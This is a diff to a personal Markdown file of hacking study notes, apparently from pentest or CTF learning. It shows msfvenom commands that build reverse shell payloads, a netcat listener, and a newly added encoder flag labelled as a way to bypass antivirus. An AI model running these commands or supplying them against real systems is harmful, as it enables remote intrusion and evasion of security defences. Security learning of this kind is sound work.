@@ -103,6 +103,7 @@ Random notes I've made while learning about hacking that might prove useful in t
 - staged: `windows/shell_reverse_tcp`
 - ex; generate Windows x64 reverse shell in exe format: `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
 - ex; generate reverse netcat payload: `msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`
+- encode example to bypass AV: `--encoder x86/shikata_ga_nai`
 
 ### Reverse Shell with command injection
 - on own pc: `sudo nc -lvnp 443`
